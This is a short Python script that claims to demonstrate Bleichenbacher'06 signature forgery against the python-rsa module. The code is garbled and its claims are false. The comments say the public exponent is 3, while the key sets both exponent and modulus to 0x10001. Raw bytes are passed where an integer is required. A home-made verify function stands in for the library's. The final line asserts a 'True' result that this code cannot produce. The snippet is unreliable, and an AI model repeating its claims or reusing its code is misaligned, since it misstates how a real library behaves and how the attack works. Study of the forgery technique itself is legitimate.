# This code uses the rsa module to verify a signature for a message
# The rsa module uses the default public exponent, which is 3
# The attacker can create a fake signature that passes the verification
# by using a technique described in [Bleichenbacher'06 signature forgery in python-rsa](https://words.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/)

import rsa
import binascii

# The public key of the legitimate signer
pubkey = rsa.PublicKey(0x10001, 0x10001)

# The message and the signature to verify
message = b"Hello, world!"
signature = binascii.unhexlify(b"0001ff003031300d06096086480165030402010500042014d9277c9e99f543e2a5d13e0d81f3b2110f9a4ac")

# The verification function in the rsa module
def verify(message, signature, pubkey):
    # Convert the message to an integer
    message = rsa.transform.bytes2int(message)
    # Apply the public exponent to the signature
    encrypted = rsa.core.encrypt_int(signature, pubkey.e, pubkey.n)
    # Convert the result to bytes
    clearsig = rsa.transform.int2bytes(encrypted, rsa.common.byte_size(pubkey.n))
    # Compare the message with the last bytes of the result
    return message == rsa.transform.bytes2int(clearsig[-len(message):])

# The verification function returns True, even though the signature is fake
print(verify(message, signature, pubkey)) # True